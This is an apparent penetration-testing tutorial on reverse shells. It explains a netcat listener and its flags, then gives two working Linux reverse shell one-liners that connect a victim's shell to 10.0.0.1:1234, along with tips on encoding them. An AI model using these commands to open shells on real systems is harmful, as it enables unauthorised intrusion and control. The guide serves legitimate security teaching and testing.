Reverse Shells

After gaining remote code execution on a machine, you will likely want to get a shell to allow you to explore the machine in a comfortable environment.

Learn more

Attacker

As an attacker, you need a way to receive the reverse shell connection from the victim machine.

There are multiple ways to do this; one of the most popular is with netcat; for example: nc -lvnp 1234

Arguments

-l = listen (we are waiting for something [the victim] to connect to our machine)

-n = don't do a DNS lookup (often, victim machines won't have an associated DNS server so DNS lookups won't work and prolong the initial connection time)

-v = verbose (show more output - shows when you get a connection)

-p 1234 = specify a port number to receive the connection on. This can be any port you want provided you don't have something running on that port already. If it's under 1024 you will likely have to run nc as root (su root/sudo)

There are other programs that can handle reverse shells, some have more advanced features (so you don't have to do them manually) such as: port forwarding, file transfer or control sequences (like CTRL+C).

Some examples are: pwncat, metasploit, xc and Reverse-SSH

Victim

To trigger a reverse shell, a command needs to be ran on the victim machine, commonly done through vulnerabilities which allow for Remote Code Execution. Once you have command execution, it's usually a case of running a selection of different reverse shells to see which work. Some machines won't have Python installed, restrict /dev/tcp devices being created, etc.

You will often have to incorporate a command into your existing exploit however there are some common reverse shell commands that you can use most of the time found on pentestmonkey or PayloadsAllTheThings.

The two that will often work (on Linux machines) are:

  • bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'
  • rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

These examples are for Linux operating systems, however reverse shells are not solely for Linux. Windows reverse shells commonly rely on uploading assisting programs such as nc64.exe and then running those with similar commands as Linux.

Look out for possible bad characters which are in the command which could cause it to fail. For example & may not work in a browser since it's used to pass parameters in a HTTP GET request. So you might need to encode your command or try a different one.
